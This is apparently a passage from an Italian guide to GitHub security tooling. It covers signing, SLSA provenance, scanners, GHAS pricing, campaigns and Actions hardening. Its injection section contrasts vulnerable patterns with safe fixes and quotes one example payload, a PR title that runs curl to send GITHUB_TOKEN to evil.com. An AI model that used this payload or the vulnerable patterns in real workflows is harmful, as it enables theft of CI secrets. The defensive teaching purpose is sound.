          fail-on-severity: moderate
          # Blocca licenze non approvate
          deny-licenses: GPL-3.0, AGPL-3.0
          # Permetti solo queste licenze
          # allow-licenses: MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause, ISC
          # Commenta sulla PR con i dettagli
          comment-summary-in-pr: always
```

---

## Supply Chain Security

### Sigstore e Cosign

Sigstore è un progetto della Linux Foundation per la firma crittografica e la verifica degli artefatti software. Usa firma "keyless" basata su identità OIDC — niente chiavi private da gestire.

```bash
# Installare cosign
# https://docs.sigstore.dev/cosign/system_config/installation/

# Firmare un'immagine container con cosign (keyless)
cosign sign --yes ghcr.io/org/app:v1.0.0
# Usa OIDC token da GitHub Actions, Google, Microsoft, ecc.
# La firma viene salvata nel registro OCI accanto all'immagine

# Verificare la firma
cosign verify ghcr.io/org/app:v1.0.0 \
  --certificate-identity="https://github.com/org/repo/.github/workflows/build.yml@refs/tags/v1.0.0" \
  --certificate-oidc-issuer="https://token.actions.githubusercontent.com"

# Firmare un artefatto generico (con chiave)
cosign generate-key-pair
cosign sign-blob --key cosign.key --output-signature sig.txt artifact.tar.gz

# Verificare con chiave pubblica
cosign verify-blob --key cosign.pub --signature sig.txt artifact.tar.gz

# Firmare con key in KMS
cosign sign --key hashivault://signing-key ghcr.io/org/app:v1.0.0
cosign sign --key awskms:///arn:aws:kms:us-east-1:123456:key/abc ghcr.io/org/app:v1.0.0
cosign sign --key gcpkms://projects/my-project/locations/global/keyRings/my-ring/cryptoKeys/my-key ghcr.io/org/app:v1.0.0
```

### SLSA (Supply chain Levels for Software Artifacts)

SLSA è un framework per la sicurezza della supply chain con livelli crescenti di protezione:

| Livello | Requisiti | Protezione |
|---------|-----------|------------|
| SLSA 1 | Build documentata con provenance | Sapere chi ha costruito cosa e come |
| SLSA 2 | Build su piattaforma trusted (es. GitHub Actions) | Protegge da build compromise |
| SLSA 3 | Build isolata con provenance firmata e non falsificabile | Protegge da insider threats |
| SLSA 4 | Build riproducibile con review a due persone | Massima garanzia |

```yaml
# .github/workflows/slsa-provenance.yml
name: SLSA Provenance

on:
  release:
    types: [published]

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      hashes: ${{ steps.hash.outputs.hashes }}
    steps:
      - uses: actions/checkout@v4

      - name: Build
        run: |
          npm ci
          npm run build
          tar -czf dist.tar.gz dist/

      - name: Generate hash
        id: hash
        run: |
          HASH=$(sha256sum dist.tar.gz | base64 -w0)
          echo "hashes=$HASH" >> "$GITHUB_OUTPUT"

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist.tar.gz

  provenance:
    needs: [build]
    permissions:
      actions: read
      id-token: write
      contents: write
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.0.0
    with:
      base64-subjects: "${{ needs.build.outputs.hashes }}"
      upload-assets: true

  verify:
    needs: [provenance]
    runs-on: ubuntu-latest
    steps:
      - name: Install slsa-verifier
        uses: slsa-framework/slsa-verifier/actions/installer@v2.5.1

      - name: Download artifact
        uses: actions/download-artifact@v4
        with:
          name: dist

      - name: Verify provenance
        run: |
          slsa-verifier verify-artifact dist.tar.gz \
            --provenance-path multiple.intoto.jsonl \
            --source-uri github.com/${{ github.repository }} \
            --source-tag ${{ github.ref_name }}
```

### Artifact Attestations (GitHub-native)

GitHub supporta le artifact attestations per verificare la provenienza degli artefatti senza tooling esterno:

```yaml
# .github/workflows/attest.yml
name: Build and Attest

on:
  push:
    tags: ['v*']

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
      attestations: write
    steps:
      - uses: actions/checkout@v4

      - name: Build
        run: |
          npm ci && npm run build
          tar -czf app.tar.gz dist/

      # Attestation per artefatto generico
      - name: Attest Build Provenance
        uses: actions/attest-build-provenance@v2
        with:
          subject-path: 'app.tar.gz'

      # Attestation per container image
      - name: Build and push Docker image
        id: docker
        run: |
          docker build -t ghcr.io/org/app:${{ github.ref_name }} .
          docker push ghcr.io/org/app:${{ github.ref_name }}
          echo "digest=$(docker inspect --format='{{index .RepoDigests 0}}' ghcr.io/org/app:${{ github.ref_name }} | cut -d@ -f2)" >> "$GITHUB_OUTPUT"

      - name: Attest Docker Image
        uses: actions/attest-build-provenance@v2
        with:
          subject-name: ghcr.io/org/app
          subject-digest: ${{ steps.docker.outputs.digest }}
```

```bash
# Verificare un'attestation
gh attestation verify app.tar.gz --owner org

# Verificare un'immagine Docker
gh attestation verify oci://ghcr.io/org/app:v1.0.0 --owner org

# Output: elenco delle attestazioni con signer, workflow, commit SHA
```

---

## Code Scanning con Strumenti di Terze Parti

### SARIF (Static Analysis Results Interchange Format)

Qualsiasi strumento che produce output SARIF può essere integrato con il code scanning di GitHub. SARIF è uno standard OASIS per i risultati di analisi statica.

```yaml
# .github/workflows/security-tools.yml
name: Security Scanning (Third Party)

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'

jobs:
  # Semgrep — analisi statica multi-linguaggio
  semgrep:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/owasp-top-ten
            p/javascript
            p/python
            p/secrets
          generateSarif: "1"

      - name: Upload SARIF
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: semgrep.sarif
          category: semgrep

  # Trivy — vulnerability scanner per container, filesystem, IaC
  trivy-container:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Build image
        run: docker build -t app:scan .

      - name: Run Trivy (container)
        uses: aquasecurity/trivy-action@0.24.0
        with:
          image-ref: 'app:scan'
          format: 'sarif'
          output: 'trivy-container.sarif'
          severity: 'CRITICAL,HIGH'
          ignore-unfixed: true

      - name: Upload Trivy SARIF
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'trivy-container.sarif'
          category: trivy-container

  # Trivy — IaC scanning (Terraform, CloudFormation, Kubernetes)
  trivy-iac:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Run Trivy (IaC)
        uses: aquasecurity/trivy-action@0.24.0
        with:
          scan-type: 'config'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-iac.sarif'

      - name: Upload Trivy IaC SARIF
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'trivy-iac.sarif'
          category: trivy-iac

  # Snyk — SCA + SAST
  snyk:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Run Snyk (SCA)
        uses: snyk/actions/node@master
        continue-on-error: true
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --sarif-file-output=snyk-sca.sarif

      - name: Run Snyk Code (SAST)
        uses: snyk/actions/node@master
        continue-on-error: true
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          command: code test
          args: --sarif-file-output=snyk-code.sarif

      - name: Upload Snyk SCA SARIF
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: snyk-sca.sarif
          category: snyk-sca

      - name: Upload Snyk Code SARIF
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: snyk-code.sarif
          category: snyk-code

  # Checkov — IaC security scanner
  checkov:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Run Checkov
        uses: bridgecrewio/checkov-action@v12
        with:
          directory: .
          framework: terraform,cloudformation,kubernetes
          output_format: sarif
          output_file_path: checkov.sarif

      - name: Upload Checkov SARIF
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: checkov.sarif
          category: checkov
```

### Pre-commit Hooks per Sicurezza Locale

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']

  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.4
    hooks:
      - id: gitleaks

  - repo: https://github.com/antonbabenko/pre-commit-terraform
    rev: v1.88.0
    hooks:
      - id: terraform_tfsec
      - id: terraform_checkov
```

```bash
# Installare e attivare i pre-commit hooks
pip install pre-commit
pre-commit install

# Generare il baseline per detect-secrets (ignora segreti già noti)
detect-secrets scan > .secrets.baseline
detect-secrets audit .secrets.baseline
```

---

## GitHub Advanced Security (GHAS) — Licenze e Rollout

### Modello di Licenza

GHAS è disponibile per:
- **Repository pubblici** — Tutte le funzionalità GHAS sono gratuite
- **Repository privati** — Richiede licenza GHAS (per-committer pricing)
- **GitHub Enterprise Cloud/Server** — GHAS è un add-on

Il prezzo è basato sul numero di **active committers** — utenti che hanno fatto almeno un commit in un repository con GHAS abilitato negli ultimi 90 giorni.

### Rollout Progressivo

Per organizzazioni grandi, il rollout di GHAS dovrebbe essere progressivo:

```
Fase 1: Pilota (1-2 settimane)
  → Abilitare su 3-5 repository ad alto rischio
  → Team: security champions di ogni area
  → Obiettivo: validare configuration, capire il volume di alert

Fase 2: Triage iniziale (2-4 settimane)
  → Risolvere tutti gli alert CRITICAL e HIGH
  → Creare custom CodeQL queries per pattern specifici
  → Definire processo di triage e SLA

Fase 3: Espansione (1-3 mesi)
  → Abilitare su tutti i repository attivi
  → Attivare push protection
  → Integrare nel PR workflow (required checks)

Fase 4: Manutenzione (ongoing)
  → Weekly triage meetings
  → Aggiornare custom patterns/queries
  → Review metriche (MTTR, trend alert, coverage)
```

### Metriche di Successo

| Metrica | Target |
|---|---|
| Coverage (repo con scanning abilitato) | > 95% |
| MTTR Critical (Mean Time To Resolve) | < 24h |
| MTTR High | < 1 settimana |
| False positive rate | < 10% |
| Alert backlog trend | Decrescente |
| Push protection bypass rate | < 5% |

### Struttura dei Prodotti di Sicurezza GitHub (2025-2026)

A partire dal 2025, GitHub ha riorganizzato i prodotti di sicurezza in due offerte principali:

```
┌──────────────────────────────────────────────────────────┐
│  GitHub Secret Protection (precedentemente parte di GHAS) │
│  ─────────────────────────────────────────────────────── │
│  • Secret scanning alerts                                │
│  • Push protection                                       │
│  • Custom patterns                                       │
│  • Copilot generic password detection                    │
│  • Validity checks                                       │
│  • Extended metadata                                     │
│  • Security insights per secret scanning                 │
│  • Delegated bypass                                      │
│                                                          │
│  Prezzo: per-active-committer, separato da Code Security │
├──────────────────────────────────────────────────────────┤
│  GitHub Code Security (precedentemente parte di GHAS)     │
│  ─────────────────────────────────────────────────────── │
│  • CodeQL code scanning                                  │
│  • Copilot Autofix                                       │
│  • Model packs                                           │
│  • Custom CodeQL queries                                 │
│  • Dependency review action                              │
│  • Security campaigns                                    │
│  • Security overview dashboard                           │
│                                                          │
│  Prezzo: per-active-committer, separato da Secret Prot.  │
├──────────────────────────────────────────────────────────┤
│  Gratuito per tutti (public + private)                    │
│  ─────────────────────────────────────────────────────── │
│  • Dependabot alerts                                     │
│  • Dependabot security updates                           │
│  • Dependabot version updates                            │
│  • Dependency graph                                      │
│  • SBOM generation                                       │
│  • Advisory database access                              │
│  • Auto-triage preset (Dismiss low impact)               │
│  • Secret scanning + push protection (public repos only) │
│  • CodeQL (public repos only)                            │
└──────────────────────────────────────────────────────────┘
```

#### Modello di Pricing Dettagliato (2025-2026)

Con la separazione dei prodotti, GitHub ha introdotto un modello di prezzo granulare che consente alle organizzazioni di acquistare solo le funzionalità di sicurezza di cui hanno effettivamente bisogno, eliminando la necessità di acquistare l'intero bundle GHAS:

```
Pricing per Active Committer (mensile):

  Prodotto                        Prezzo      Note
  ──────────────────────────────────────────────────────────────
  GitHub Code Security            $30/mese    CodeQL, Autofix, campaigns,
                                              dependency review, overview
  GitHub Secret Protection        $19/mese    Secret scanning, push protection,
                                              custom patterns, delegated bypass
  Bundle precedente (GHAS)        $49/mese    Includeva tutto (non più venduto
                                              separatamente per nuovi clienti)
  ──────────────────────────────────────────────────────────────

  Definizione di "Active Committer":
    → Utente che ha effettuato almeno un commit in un repository
      con la funzionalità di sicurezza abilitata negli ultimi
      90 giorni. Utenti inattivi non vengono conteggiati.

  Nota: Dependabot (alerts, security updates, version updates)
  e dependency graph rimangono completamente GRATUITI per tutti
  i piani GitHub (Free, Team, Enterprise).
```

A partire da aprile 2025, GitHub ha introdotto anche un **modello pay-as-you-go basato sul consumo** per i clienti GitHub Team, rendendo accessibili le funzionalità di sicurezza avanzata anche ad organizzazioni con budget limitato. Questo modello fattura in base all'utilizzo effettivo misurato in "metered units" piuttosto che richiedere un impegno mensile fisso per active committer.

Il modello pay-as-you-go presenta vantaggi significativi per team di piccole e medie dimensioni:

- **Nessun costo fisso iniziale** — Si paga solo quando le funzionalità vengono effettivamente utilizzate
- **Scalabilità elastica** — Il costo cresce proporzionalmente all'adozione, senza salti di prezzo
- **Prevedibilità migliorata** — Dashboard di consumo in tempo reale permettono di monitorare la spesa
- **Periodo di prova implicito** — I team possono valutare le funzionalità senza committare budget anticipato

Per le organizzazioni Enterprise con molti repository, il modello per-active-committer risulta generalmente più conveniente del pay-as-you-go, poiché il costo è prevedibile indipendentemente dal numero di scansioni eseguite. GitHub raccomanda di analizzare il numero di active committer effettivi prima di scegliere il modello di pricing, utilizzando l'API di billing:

```bash
# Verificare il numero di active committer per la licenza di sicurezza
gh api orgs/{org}/settings/billing/advanced-security \
  --jq '{
    total_active_committers: .total_advanced_security_committers,
    repositories: [.repositories[] | {
      name: .name,
      committers: .advanced_security_committers,
      features: {
        code_security: .advanced_security_committers_breakdown
          | map(select(.user_login != null)) | length,
        secret_protection: .advanced_security_committers_breakdown
          | map(select(.last_pushed_date != null)) | length
      }
    }] | sort_by(.committers) | reverse | .[0:10]
  }'

# Stimare il costo mensile basato sugli active committer attuali
# Formula: committers × prezzo_prodotto
# Esempio: 50 committer × ($30 Code + $19 Secret) = $2,450/mese
```

---

## Security Campaigns — Remediation Coordinata su Scala

Le security campaigns sono iniziative organizzate e temporalmente limitate per identificare, rimediare e prevenire vulnerabilità su più repository contemporaneamente. Rappresentano il passaggio fondamentale dalla semplice **rilevazione** alla **risoluzione** effettiva del debito di sicurezza.

### Problema che Risolvono

```
Scenario tipico SENZA campaigns:
  → CodeQL rileva 500 alert su 50 repository
  → Gli alert finiscono nel backlog di ogni team
  → Senza coordinamento, ogni team assegna priorità diversa
  → Dopo 6 mesi, solo il 10% degli alert è stato risolto
  → Il debito di sicurezza cresce esponenzialmente

Scenario CON campaigns:
  → Il team di sicurezza crea una campaign "Fix SQL Injection Q1"
  → Seleziona 100 alert rilevanti su 30 repository
  → Copilot Autofix genera suggerimenti per fino a 1000 alert
  → Gli sviluppatori ricevono notifiche mirate con fix pronti
  → Dopo 6 settimane, il 55% degli alert è stato risolto
  → Miglioramento di 5.5x rispetto al flusso senza campaigns
```

### Creare una Security Campaign

```bash
# Le campaigns sono gestite tramite l'interfaccia web:
# Organization → Security → Campaigns → New campaign

# Parametri di una campaign:
# - Nome: "Fix Critical XSS Vulnerabilities — Q2 2026"
# - Descrizione: descrizione dettagliata dell'obiettivo
# - Alert selezionati: fino a 1000 alert da code scanning o secret scanning
# - Deadline: data target per la risoluzione
# - Team assegnati: team responsabili della remediation

# A partire da settembre 2025, le campaigns supportano anche
# gli alert di secret scanning, non solo code scanning

# Monitorare il progresso via API
gh api orgs/{org}/security-campaigns \
  --jq '.[] | {
    name,
    state,
    alert_count: .alerts_count,
    fixed_count: .fixed_alerts_count,
    progress_percentage: (.fixed_alerts_count / .alerts_count * 100)
  }'
```

### Flusso di una Campaign

```
1. CREAZIONE (Security Team)
   → Selezionare gli alert target dalla Security Overview
   → Filtrare per rule, severity, repository, linguaggio
   → Assegnare team e deadline

2. GENERAZIONE AUTOFIX (Automatico)
   → Copilot Autofix genera suggerimenti per tutti gli alert
   → I fix vengono pre-calcolati e pronti per il review

3. NOTIFICA (Automatico)
   → Gli sviluppatori ricevono notifiche personalizzate
   → Ogni notifica include: alert, fix suggerito, deadline
   → Dashboard di progresso visibile a tutti

4. REMEDIATION (Sviluppatori)
   → Revieware il fix suggerito da Copilot
   → Applicare, modificare, o scrivere un fix manuale
   → Committare la fix e chiudere l'alert

5. TRACKING (Security Team)
   → Dashboard in tempo reale con % di completamento
   → Identificare repository/team in ritardo
   → Escalation se necessario
```

### Best Practice per le Campaigns

1. **Ambito limitato** — Una campaign per tipologia di vulnerabilità (es. solo SQL Injection, solo XSS), non "fix everything"
2. **Deadline realistiche** — 4-8 settimane per campagne di media dimensione (50-200 alert)
3. **Copilot Autofix come acceleratore** — Generare fix automatici riduce drasticamente il tempo di remediation
4. **Comunicazione** — Kickoff meeting con i team coinvolti per spiegare l'obiettivo e il processo
5. **Metriche** — Tracciare il tasso di risoluzione e usarlo per calibrare le campaigns future

---

## GitHub Advisory Database — Dettaglio

### Struttura del Database

Il GitHub Advisory Database è il database pubblico di vulnerabilità su cui si basano Dependabot e la dependency review. È una combinazione di fonti multiple:

```
Fonti del GitHub Advisory Database:

1. GitHub Repository Advisories (GRAs)
   → Advisory create direttamente dai maintainer dei repository
   → Processate tramite il processo di review di GitHub
   → Fast path: tempo medio di review più breve

2. National Vulnerability Database (NVD)
   → CVE pubblicate dal NIST
   → Slow path: tempo medio di review più lungo
   → GitHub arricchisce le CVE del NVD con mappature agli ecosistemi

3. Contributi community
   → Chiunque può proporre modifiche alle advisory esistenti
   → Le modifiche vengono reviewate dal team GitHub Security

4. Partner advisories
   → Advisory inviate direttamente dai provider di pacchetti
   → npm, PyPI, RubyGems, Go, Maven, NuGet, ecc.
```

### Identificatori GHSA

Ogni advisory nel database ha un identificatore GHSA unico con il formato `GHSA-xxxx-xxxx-xxxx`, dove ogni carattere è una lettera o numero dall'insieme `{2, 3, 4, 5, 6, 7, 8, 9, c, f, g, h, j, m, p, q, r, v, w, x}`. Questa scelta di caratteri esclude lettere ambigue (come `l`/`1`, `o`/`0`) per facilitare la comunicazione verbale degli ID.

### Formato OSV

Le advisory sono archiviate nel formato Open Source Vulnerability (OSV), uno standard che consente l'interoperabilità tra diversi database di vulnerabilità:

```json
{
  "schema_version": "1.4.0",
  "id": "GHSA-xxxx-xxxx-xxxx",
  "modified": "2026-01-15T10:30:00Z",
  "published": "2026-01-10T08:00:00Z",
  "aliases": ["CVE-2026-12345"],
  "summary": "SQL Injection in my-package query builder",
  "details": "The query builder in my-package before 2.1.0 is vulnerable...",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "npm",
        "name": "my-package"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {"introduced": "0"},
            {"fixed": "2.1.0"}
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "<= 2.0.9"
      }
    }
  ],
  "references": [
    {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-xxxx-xxxx-xxxx"},
    {"type": "FIX", "url": "https://github.com/org/my-package/commit/abc123"}
  ],
  "database_specific": {
    "cwe_ids": ["CWE-89"],
    "severity": "HIGH",
    "github_reviewed": true,
    "github_reviewed_at": "2026-01-12T14:00:00Z"
  }
}
```

### GitHub come CNA (CVE Numbering Authority)

GitHub è un CNA autorizzato dal programma CVE, il che significa che può assegnare direttamente CVE ID alle vulnerabilità segnalate nei repository GitHub. Questo accelera il processo di disclosure:

```
Flusso di assegnazione CVE tramite GitHub:

1. Maintainer o ricercatore segnala la vulnerabilità
   → Tramite Private Vulnerability Reporting o advisory draft

2. Il maintainer crea un security advisory nel repository
   → Descrive la vulnerabilità, le versioni affette, la remediation

3. Il maintainer richiede un CVE ID tramite GitHub
   → Click su "Request CVE" nell'advisory
   → GitHub assegna il CVE in poche ore (vs. settimane con MITRE)

4. L'advisory viene pubblicata con il CVE
   → Automaticamente aggiunta al GitHub Advisory Database
   → Dependabot rileva la vulnerabilità nei repository dipendenti
   → I provider di pacchetti ricevono notifica
```

---

## Security Overview — Dashboard Organizzativa

La Security Overview fornisce una dashboard centralizzata per monitorare lo stato della sicurezza su tutti i repository di un'organizzazione. Disponibile per organizzazioni con GitHub Code Security o GitHub Secret Protection.

### Viste Disponibili

```
Security Overview → Dashboard principale
  ├── Overview
  │   ├── Detection trends (alert aperti/chiusi nel tempo)
  │   ├── Remediation trends (MTTR, velocità di fix)
  │   └── Prevention trends (alert prevenuti da push protection)
  │
  ├── Risk
  │   ├── Repository con alert critici non risolti
  │   ├── Ordinamento per rischio complessivo
  │   └── Filtri per severity, tool, team
  │
  ├── Coverage
  │   ├── % di repository con code scanning abilitato
  │   ├── % di repository con secret scanning abilitato
  │   ├── % di repository con Dependabot abilitato
  │   └── Repository senza protezione (gap analysis)
  │
  ├── CodeQL Pull Request Alerts
  │   ├── Alert introdotti nelle PR
  │   ├── Alert risolti prima del merge
  │   └── Impatto di Copilot Autofix sulle PR
  │
  ├── Secret Scanning Metrics
  │   ├── Segreti rilevati per tipo
  │   ├── Push protection blocks
  │   ├── Bypass rate e motivi
  │   └── Tempo medio di revoca
  │
  ├── Dependabot
  │   ├── Alert aperti per severity
  │   ├── Tempo medio di aggiornamento
  │   ├── Auto-merge rate
  │   └── Dipendenze più vulnerabili (top 10)
  │
  ├── Enablement Trends
  │   ├── Adozione delle funzionalità nel tempo
  │   ├── Repository appena configurati
  │   └── Gap rispetto alla policy aziendale
  │
  └── Campaigns
      ├── Campaigns attive e progresso
      ├── Alert risolti tramite campaign
      └── Storico delle campaigns completate
```

#### Enablement Trends a Livello Enterprise (2025)

A partire da ottobre 2025, la Security Overview ha introdotto gli **Enablement Trends a livello Enterprise**, che forniscono una vista storica e aggregata dell'adozione delle funzionalità di sicurezza su tutte le organizzazioni dell'Enterprise account. Questa funzionalità risponde alla domanda fondamentale dei CISO: "stiamo migliorando la nostra postura di sicurezza nel tempo, oppure stiamo regredendo?"

```
Modello di visualizzazione Enablement Trends:

  ┌── Detection ──────────────────────────────────────────┐
  │                                                        │
  │  Misura quanti alert vengono rilevati nel tempo.       │
  │  Trend crescente = maggiore copertura di scansione     │
  │  (positivo se accompagnato da remediation crescente).  │
  │                                                        │
  │  Indicatori: alert/settimana, alert/repo, nuovi vs    │
  │  ricorrenti, severity distribution nel tempo           │
  │                                                        │
  ├── Remediation ────────────────────────────────────────┤
  │                                                        │
  │  Misura quanti alert vengono risolti nel tempo.        │
  │  Metriche chiave:                                      │
  │  • Mean Time To Remediate (MTTR) per severity          │
  │  • % alert risolti entro SLA (14gg critical, 30gg      │
  │    high, 90gg medium)                                  │
  │  • Trend di riduzione del backlog                      │
  │  • Tasso di riapertura alert (alert risolti e poi      │
  │    reintrodotti)                                       │
  │                                                        │
  ├── Prevention ─────────────────────────────────────────┤
  │                                                        │
  │  Misura quanti problemi vengono BLOCCATI prima del     │
  │  merge o del push:                                     │
  │  • Push protection blocks (secret scanning)            │
  │  • PR check failures (code scanning)                   │
  │  • Dependency review blocks                            │
  │  • % di vulnerabilità catturate in pre-merge           │
  │                                                        │
  └────────────────────────────────────────────────────────┘

  Ogni pannello mostra:
  • Valore attuale
  • Trend % (settimana su settimana, mese su mese)
  • Indicatore visivo: ↑ miglioramento, ↓ peggioramento, → stabile
  • Breakdown per organizzazione e per tipo di alert
```

Gli Enablement Trends includono anche **indicatori di variazione percentuale** che evidenziano cambiamenti significativi: un aumento del 15% o più nel tasso di rilevamento senza un corrispondente aumento nella remediation genera automaticamente un avviso nel dashboard, segnalando che il debito di sicurezza sta crescendo. Analogamente, un calo improvviso nella detection può indicare che delle funzionalità di scansione sono state disabilitate accidentalmente.

Per le organizzazioni con requisiti di compliance, gli Enablement Trends forniscono dati esportabili in formato CSV e JSON, utilizzabili per report periodici verso auditor interni ed esterni. I dati storici vengono conservati per almeno 24 mesi, consentendo analisi di tendenza a lungo termine e confronti anno su anno.

### API per Security Overview

```bash
# Ottenere la panoramica degli alert per l'organizzazione
# Code scanning alerts
gh api orgs/{org}/code-scanning/alerts?state=open \
  --jq 'group_by(.rule.security_severity_level) | map({
    severity: .[0].rule.security_severity_level,
    count: length,
    repos: [.[].repository.name] | unique
  })'

# Dependabot alerts aggregati
gh api orgs/{org}/dependabot/alerts?state=open \
  --jq 'group_by(.security_advisory.severity) | map({
    severity: .[0].security_advisory.severity,
    count: length,
    top_packages: [.[].security_vulnerability.package.name] | group_by(.) | map({name: .[0], count: length}) | sort_by(.count) | reverse | .[0:5]
  })'

# Secret scanning alerts aperti
gh api orgs/{org}/secret-scanning/alerts?state=open \
  --jq 'group_by(.secret_type_display_name) | map({
    type: .[0].secret_type_display_name,
    count: length,
    repos: [.[].repository.name] | unique | length
  }) | sort_by(.count) | reverse'

# Coverage: repository senza scanning abilitato
gh api orgs/{org}/repos --paginate \
  --jq '.[] | select(.security_and_analysis.advanced_security.status != "enabled") | .name'
```

---

## Hardening della Sicurezza di GitHub Actions

La sicurezza dei workflow GitHub Actions è fondamentale perché i workflow hanno accesso a segreti, token di autenticazione e permessi di scrittura sul repository. Un workflow compromesso può portare a supply chain attacks su larga scala.

### Principi di Hardening

#### 1. Pinning degli SHA per le Actions

Mai usare tag mutabili (`@v4`, `@main`) per actions di terze parti in workflow di sicurezza. Usare sempre il full commit SHA:

```yaml
# SBAGLIATO — tag mutabile, vulnerabile a tag hijacking
- uses: actions/checkout@v4

# CORRETTO — SHA immutabile, verificabile
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1

# A partire da agosto 2025, è possibile configurare
# una policy organizzativa che OBBLIGA il SHA pinning:
# Organization Settings → Actions → General → Actions permissions
#   → Require SHA pinning for all actions
# I workflow con azioni non pinnate falliranno automaticamente
```

#### 2. Permessi Minimi per Job

```yaml
# SBAGLIATO — permessi a livello di workflow
permissions: write-all

# CORRETTO — permessi per singolo job
jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read          # Leggere il codice
      security-events: write  # Pubblicare risultati SARIF
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/analyze@v3

  deploy:
    needs: scan
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write   # OIDC per autenticazione cloud
      packages: write   # Push immagini container
    steps:
      # ...
```

#### 3. OIDC per Autenticazione Cloud (Zero Secrets)

```yaml
# Invece di usare segreti statici (AWS_ACCESS_KEY_ID),
# usare OIDC per ottenere credenziali temporanee:

jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions
          aws-region: eu-west-1
          # Nessun secret necessario! L'autenticazione usa il token OIDC
          # generato automaticamente da GitHub Actions

      # Provider supportati:
      # - AWS (via aws-actions/configure-aws-credentials)
      # - Azure (via azure/login)
      # - Google Cloud (via google-github-actions/auth)
      # - HashiCorp Vault (via hashicorp/vault-action)
```

#### 4. Protezione da Workflow Injection

```yaml
# VULNERABILE — Injection tramite titolo della PR
- run: echo "PR title: ${{ github.event.pull_request.title }}"
# Un attaccante può creare una PR con titolo:
# "; curl https://evil.com/steal?token=$GITHUB_TOKEN #

# SICURO — Usare variabili d'ambiente intermedie
- run: echo "PR title: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}

# VULNERABILE — pull_request_target con checkout del fork
on:
  pull_request_target:
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
  # PERICOLO: il codice del fork viene eseguito con i permessi del repo base
  # e con accesso ai secrets
  - run: npm test  # Potrebbe eseguire codice malevolo dal fork

# SICURO — Se devi usare pull_request_target,
# NON fare checkout del codice del fork
# oppure eseguilo in un container isolato senza secrets
```

#### 5. Blocco di Actions Compromesse

```yaml
# Configurazione organizzativa per bloccare actions specifiche
# durante un incidente di sicurezza (da agosto 2025):

# Organization Settings → Actions → General → Actions permissions
# Bloccare un'action specifica:
#   !compromised-org/compromised-action
# Il prefisso ! blocca l'action — i workflow che la usano falliranno

# Esempio reale: CVE-2025-30066 (tj-actions/changed-files)
# L'action è stata compromessa e usata per esfiltrare segreti
# Blocco immediato: !tj-actions/changed-files
```

---

## Automazioni di Sicurezza con GitHub Actions

### Workflow Completo di Security Pipeline

```yaml
# .github/workflows/security-pipeline.yml
name: Security Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'  # Weekly full scan

permissions:
  contents: read
  security-events: write
  pull-requests: write

jobs:
  # 1. Dependency review (solo su PR)
  dependency-review:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high
          deny-licenses: GPL-3.0, AGPL-3.0
          comment-summary-in-pr: always

  # 2. Secret scanning (pre-commit hook enforcement)
  secret-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Run gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  # 3. SAST con CodeQL
  codeql:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        language: ['javascript-typescript', 'python']
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          queries: +security-extended
      - uses: github/codeql-action/autobuild@v3
      - uses: github/codeql-action/analyze@v3

  # 4. Container scanning
  container-scan:
